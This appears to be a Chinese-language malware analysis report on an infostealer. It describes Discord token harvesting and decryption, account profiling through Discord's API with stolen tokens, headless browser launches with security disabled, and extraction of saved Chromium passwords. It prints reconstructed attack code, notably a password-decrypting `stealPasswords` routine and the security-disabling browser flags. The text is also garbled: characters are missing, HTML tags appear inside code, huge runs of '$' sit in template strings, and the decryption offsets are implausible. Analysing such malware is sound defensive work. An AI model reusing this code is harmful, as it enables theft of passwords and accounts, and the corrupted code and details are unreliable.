**3.1 发现 token**

**功能解析：**

1. 遍历 Discord / 浏览器本地存 LevelDB

2. 正则匹配经典 token、MFA token、宽匹配 token

3. 若命中新格式密文 token，再结合 Local State key 解密

4. 去重后汇总为 token 集

**运行结果：**

● 产出后续所 Discord API 利用所需 token

**读取目标 / 请求目标：**

```
    <Discord or Browser>\Local Storage\leveldb\*.ldb   
    <Discord or Browser>\Local Storage\leveldb\*.log   
    <Discord>\Local State
```

**动态参数：**

● 已确 Discord 客户端路径：

○ C:\Users\Administrator\AppData\Roaming\discord

○ C:\Users\Administrator\AppData\Roaming\discordcanary

○ C:\Users\Administrator\AppData\Roaming\discordptb

○ C:\Users\Administrator\AppData\Roaming\discorddevelopment

● 关键动态参数：

○ 普 token regex

○ dQw4w9WgXcQ 前缀密文 token

○ Local State 中恢复出的解 key

**参数：**

● targets

○ LevelDB 路径和可 Local State 路径

● listLevelDbFiles

○ 枚举 .ldb/.log

● readText

○ 读文件文本

● regexFindAll

○ 匹配 token 模式

● readLocalStateMasterKey

○ 读取解密 key

● decryptDiscordToken

○ 解新格式 token

**代码：**

```
    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">/*扫描 .ldb / .log，匹配普 token；如果是 Discord 安装根，还尝试解密新格式 token */    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">    async function discoverDiscordTokensAcrossTargets(targets: Array<{</blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">levelDbPath:       string; localStatePath?: string }>, deps) {    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">      const discoveredTokens = new Set<string>();    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">         </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">      // 真实实现会遍历每 LevelDB 文件，分别匹配普 token 和加 token    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">      // 如果目标 Discord 客户端目录，还会读取 Local State  dQw4w9WgXcQ 前缀 token 解密    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">      return [...discoveredTokens];    </blockquote><blockquote style="color: rgb(51, 51, 51); font-family: 微软雅黑, Tahoma, Helvetica, SimSun, sans-serif;">    }
```

**3.2 账号富化**

**功能解析：**

1. token users/@me 确认账号可用

2. 并发补全支付 FA、礼品码、好友、guild 管理权限等信息

3. 把“一 token”升级成“一个高价值账号画像”

**运行结果：**

● 产出可直接用于筛选高价 Discord 账户的情报

**读取目标 / 请求目标：**

```
GET https://discord.com/api/v9/users/@me   
    GET https://discord.com/api/v9/users/@me/billing/payment-sources   
    GET https://discord.com/api/v9/users/@me/outbound-promotions/codes   
    GET https://discord.com/api/v9/users/@me/relationships   
    GET https://discord.com/api/v9/users/@me/guilds?with_counts=true
```

**动态参数：**

● 入口动态参数：

○ 已发现的 Discord token 列表

● 关键请求头：

○ Authorization: <stolen token>

**参数：**

● tokens

○ 已发现的 Discord token 列表

● fetchCurrentUser

○ 拉用户基本资料

● fetchBillingSummary

○ 拉支付信息

● fetchMfaStatus

○ 2FA 状态

● fetchGiftCodes

○ 拉促销/礼品码

● collectDiscordFriends

○ 拉好友列表

● fetchDiscordHighValueGuilds

○ 拉高价 guild

**代码：**

```
       /**   
     *  token  users/@me，再并发 billing FA、礼品码、好友和高价 guild     
     */   
    async function enrichDiscordUserProfile(tokens: string[], deps) {   
      const profiles: any[] = [];   
         
      for (const token of tokens) {   
        // 先用 users/@me 校验 token 是否有效，并拿到基础账号资料   
        const currentUser = await deps.fetchCurrentUser(token);   
        if (!currentUser) continue;   
         
        // 真实实现还会并发拉支付方式 FA、礼品码、好友和高价 guild   
        profiles.push(currentUser);   
      }   
         
      return profiles;   
    }
```

**4. 无头浏览器辅助执行链**

这一部分在代码内部会先解码内置的浏览器可执行文件路径表，确认 Chrome、Brave、Edge、ChromeBeta 等目标是否存在，然后拼出一组很长的 headless 启动参数去实际拉起浏览器。参数里会主动关闭扩展、同步、站点隔离、后台联网、Web 安全等能力，因此这条链的目的不是正常自动化测试，而是尽量在一个受控、低安全限制的浏览器环境里执行后续辅助动作。

**4.1 Chrome / Edge 头模式启动链**

**功能解析：**

1. 从内置浏览器可执行文件映射表里解 Chrome / Edge 等目标路径

2. 检查目标浏览器是否存在

3. 组装一组带大量安全禁用参数 headless 启动命令

4. 将这些任务交给后 helper 实际拉起

**运行结果：**

● 形成 Chrome / Edge 的头模式浏览器启动任务

● 可能用于后续会话注入、页面访问或 session 窃取辅助

**读取目标 / 请求目标：**

```
chrome.exe --headless=new --no-sandbox --disable-setuid-sandbox --disable-gpu   
      --disable-software-rasterizer --disable-webgl --disable-web-security   
      --disable-client-side-phishing-detection --disable-domain-reliability   
      --disable-site-isolation-trials --disable-sync --disable-translate   
      --disable-notifications --disable-permissions-api --disable-extensions   
      --disable-default-apps --disable-component-update   
      --disable-background-timer-throttling --disable-renderer-backgrounding   
      --disk-cache-size=1 --media-cache-size=1 --no-first-run
```

**动态参数：**

● 调用链：

○ qT2G09

○ tVcLge

○ launchOrSpawnDecodedBrowserExecutable

○ S1roXJN

● 浏览器路径来源：

○ browserExecutableMapBase64

● 关键运行条件

○ 可执行文件存在性检

○ 浏览器路 Base64 解码

● 关键启动标志

○ --headless=new

○ --disable-web-security

○ --disable-extensions

○ --no-sandbox

**参数：**

● browserTarget

○ 浏览器目标描述对象

● decodeBrowserExecutableMapEntries

○ 解码内置浏览器路径映射表格

● pathExists

○ 检查浏览器可执行文件是否存在

● spawnBrowserTask

○ 实际拉起浏览器任务

**代码：**

```
/**   
     * 解码浏览器路径映射，检查可执行文件是否存在，并构 headless 启动任务     
     */   
    async function launchOrSpawnDecodedBrowserExecutable(browserTarget: { browserName: string; executableKey: string }, deps) {   
      // 从内 Base64 映射表恢复出浏览器可执行文件路径   
      const executableMap = deps.decodeBrowserExecutableMapEntries(deps.browserExecutableMapBase64);   
      const executablePath = executableMap[browserTarget.executableKey];   
      if (!executablePath) return [];   
         
      // 目标浏览器不存在就直接结     
      if (!(await deps.pathExists(executablePath))) return [];   
         
      // 组装头模式浏览器启动参数，重点是关闭一大批安全与隔离功     
      const args = [   
        "--headless=new",   
        "--no-sandbox",   
        "--disable-setuid-sandbox",   
        "--disable-gpu",   
        "--disable-software-rasterizer",   
        "--disable-webgl",   
        "--disable-web-security",   
        "--disable-client-side-phishing-detection",   
        "--disable-domain-reliability",   
        "--disable-site-isolation-trials",   
        "--disable-sync",   
        "--disable-translate",   
        "--disable-notifications",   
        "--disable-permissions-api",   
        "--disable-extensions",   
        "--disable-default-apps",   
        "--disable-component-update",   
        "--disable-background-timer-throttling",   
        "--disable-renderer-backgrounding",   
        "--disk-cache-size=1",   
        "--media-cache-size=1",   
        "--no-first-run",   
      ];   
         
      // 真实链路会把任务继续交给更低 helper 或直 spawn   
      return [await deps.spawnBrowserTask(executablePath, args)];   
    }
```

**4.2 动态命中与主线作用**

**功能解析：**

1. 运行时会先从 browserExecutableMapBase64 中恢复出少数硬编码浏览器可执行文件路径

2. 这条链当前不是“所有被扫描浏览器都启动 headless”，而是优先尝试 Chrome / Brave / Edge / ChromeBeta 这一小组可执行文件

3. 动态证据已经证明它实际命中 Edge，通过附加大量安全削弱参数拉起进程

4. 因此这条链更像浏览器侧辅助执行器，用来借本地浏览器环境完成后续页面访问、会话复用或注入型操作，而不是普通本地数据库读取逻辑

**运行结果：**

● 已确认主程序当前运行中能真实拉起 msedge.exe

● 说明这条 headless 链不是纯静态死代码

**读取目标 / 请求目标：**

```
browserExecutableMapBase64:   
    - Chrome   
    - Brave   
    - Edge   
    - ChromeBeta   
         
    动态命中：   
    C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
```

**动态参数：**

● Stage14 主文件内置浏览器路径表：

○ Chrome

○ Brave

○ Edge

○ ChromeBeta

● 动态存在性检查命中：

○ C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe

● 动态事件：

○ FS\_EXISTS

○ SPAWN

● 已捕获启动参数除核心标志外，还包含：

○ --disable-webgl2

○ --disable-accelerated-2d-canvas

○ --disable-accelerated-video-decode

○ --mute-audio

○ --hide-scrollbars

○ --disable-background-networking

**参数：**

● browserExecutableMapBase64

○ 内置 Base64 编码浏览器路径字典

● decodedExecutablePath

○ 解码后的浏览器可执行文件路径

● spawnArgs

○ 一组带 headless 与降安全语义的启动参数

● spawn

○ 实际执行浏览器启动

**代码：**

```
        /**   
     * 动态日志已经证明这条链实际命中 Edge     
     * 它的意义不是直接读本地数据库，而是借浏览器本体执行浏览器侧辅助动作     
     */   
    async function runHeadlessBrowserAssistChain(deps) {   
      const executableMap = deps.decodeBrowserExecutableMapEntries(deps.browserExecutableMapBase64);   
      const edgePath = executableMap.Edge;   
      if (!edgePath) return false;   
         
      if (!(await deps.pathExists(edgePath))) return false;   
         
      await deps.spawn(edgePath, [   
        "--headless=new",   
        "--no-sandbox",   
        "--disable-web-security",   
        "--disable-extensions",   
        "--disable-background-networking",   
        "--disable-site-isolation-trials",   
      ]);   
         
      return true;   
    }
```

**5. 浏览器数据采集主线**

这一部分在代码内部会围绕各类 Chromium / Gecko profile 逐个检查关键文件是否存在，然后分别打开 SQLite 数据库或 JSON 文件，把不同类型的数据拆开导出。对 Login Data，它会查 logins 表并解密 password\_value；对 Web Data，它会取 autofill、credit\_cards、local\_stored\_cvc；对 Cookies，它会读 encrypted\_value 并按浏览器版本处理； History Bookmarks，它会提取下载记录、访问痕迹和书签树。最终这些内容会被分类写入归档目录，形成浏览器侧的主体战果。

**5.1 Chromium 登录数据**

**功能解析：**

1. 定位每个 Chromium profile 下的 Login Data

2. 查询 origin\_url / username\_value / password\_value

3. 使用 Local State 恢复 key 解密保存密码

4. 按浏览器维度写入 Passwords/\*.txt

**运行结果：**

● 产生浏览器保存账号密码的明文导出

**读取目标 / 请求目标：**

```
<Browser>\User Data\<Profile>\Login Data
```

**动态参数：**

● 目标数据库路径模式：

○ <Browser>\User Data\<Profile>\Login Data

● 已确认命中路径：

○ C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Login Data

○ C:\Users\Administrator\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

● 关键动态依赖：

○ SQLite logins 表

○ Local State 恢复出的 masterKey

**参数：**

● targets

○ 每个浏览器/配置文件对应一项

○ 含浏览器名、Login Data 路径、已恢复 masterKey

● queryLoginRows

○ 读取 SQLite logins表

● decryptChromiumSecret

○ 解密 password\_value

● appendArtifact

○ 把明文结果写进归档

**代码：**

```
async function stealPasswords(_, options) {   
      try {   
        const passwordDir = `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${options.baseDir}/Passwords`;   
        options.fileSystem.mkdir(passwordDir);   
        const passwordFile = `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${passwordDir}/Passwords.txt`;   
        const results: string[] = [];   
         
        for (const browser of options.browsers) {   
          // 跳过不需要处理的浏览     
          if (["Chrome", "Brave", "Edge", "Chrome Beta", "Avast"].includes(browser.name)) {   
            continue;   
          }   
         
          for (const profile of browser.profiles) {   
            let db: any = null;   
            try {   
              const profilePath = options.path.join(browser.basePath, profile);   
              const loginDataPath = options.path.join(profilePath, "Login Data");   
                  
              if (!options.fileSystem.existsSync(loginDataPath)) {   
                continue;   
              }   
         
              const browserName = `$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${browser.name} $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$${profile}`;   
              const masterKey = browser.masterKeys?.[profile];   
              if (!masterKey) {   
                continue;   
              }   
         
              // 打开SQLite数据     
              db = new options.database(loginDataPath, {   
                readonly: true,   
                fileMustExist: true   
              });   
                  
              db.pragma("query_only = ON");   
              db.pragma("temp_store = MEMORY");   
         
              // 查询所有登录信     
              const logins = db.prepare(`   
                SELECT origin_url, username_value, password_value, date_created   
                FROM logins   
              `).all();   
         
              for (const login of logins) {   
                try {   
                  if (!login.password_value || !login.password_value.length) {   
                    continue;   
                  }   
         
                  const encryptedData = login.password_value;   
                  const version = encryptedData.toString("utf8", 3, 29);   
                     
                  if (["v10", "v11"].includes(version)) {   
                    const nonce = encryptedData.slice(29, 127);   
                    const ciphertext = encryptedData.slice(127, encryptedData.length - 197);   
                    const authTag = encryptedData.slice(encryptedData.length - 197);   
         
                    // 解密密码   
                    const decipher = options.crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);   
                    decipher.setAuthTag(authTag);   
                    const password = Buffer.concat([   
                      decipher.update(ciphertext),   
                      decipher.final()   
                    ]).toString("utf8");   
         
                    const dateCreated = login.date_created;   
                    let formattedDate = "Unknown";   
                        
                    if (typeof dateCreated === "number" && !isNaN(dateCreated)) {   
                      const microseconds = dateCreated / 1000000;   
                      const epoch1601 = new Date("1601-01-01T00:00:00Z").getTime();   
                      const timestamp = epoch1601 + microseconds;   
                      formattedDate = new Date(timestamp).toLocaleString();   
                    }   
         
                    // 格式化输     
                    results.push(   
                      "------------------------------\n" +   
